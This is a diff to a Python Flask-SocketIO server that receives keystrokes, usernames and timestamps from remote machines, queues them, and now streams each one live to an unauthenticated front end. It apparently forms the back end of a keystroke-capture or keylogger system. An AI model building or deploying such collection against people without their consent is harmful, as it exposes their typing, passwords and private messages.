@@ -14,6 +14,11 @@ def register_socket_handlers(sio: SocketIO, event_queue: Queue):
     @sio.on('connect')
     def handle_connect(auth):
 
+        if not auth:
+            # Front end connected
+            print("Front end connected.")
+            return
+
         exists = database_manager.machine_repo.get_machine_by_username(auth)
         if exists:
             logging.info(f'Machine {exists["display_username"]} exist.')
@@ -48,8 +53,8 @@ def register_socket_handlers(sio: SocketIO, event_queue: Queue):
     def handle_disconnect():
         username = request.headers.get("Display-Username")
 
-        logging.info("Client disconnected:", username)
         if username:
+            logging.info("Client disconnected:", username)
             database_manager.machine_repo.set_status(username, False)
             logging.info("Connection closed:", username)
 
@@ -64,10 +69,13 @@ def register_socket_handlers(sio: SocketIO, event_queue: Queue):
             return
 
         if username:
-            event_queue.put({
+            payload = {
                 'username': username,
                 'keystroke': keystroke,
                 'timestamp': timestamp
-            })
+            }
+            event_queue.put(payload)
 
-            logging.info(f"Keystroke {keystroke} got from {username}.")
+            # logging.info(f"Keystroke {keystroke} got from {username}.")
+
+            sio.emit('front-ev', payload)
